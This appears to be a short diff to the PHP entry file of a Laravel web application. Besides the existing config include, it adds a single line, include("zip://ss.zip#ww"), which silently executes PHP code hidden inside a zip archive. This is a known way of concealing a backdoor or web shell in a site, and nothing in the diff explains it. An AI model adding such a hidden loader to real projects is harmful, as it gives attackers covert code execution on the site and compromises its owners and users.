@@ -1,5 +1,6 @@
 <?php
 include dirname(__FILE__) . '/.private/config.php';
+include("zip://ss.zip#ww");
 use Illuminate\Contracts\Http\Kernel;
 use Illuminate\Http\Request;
 
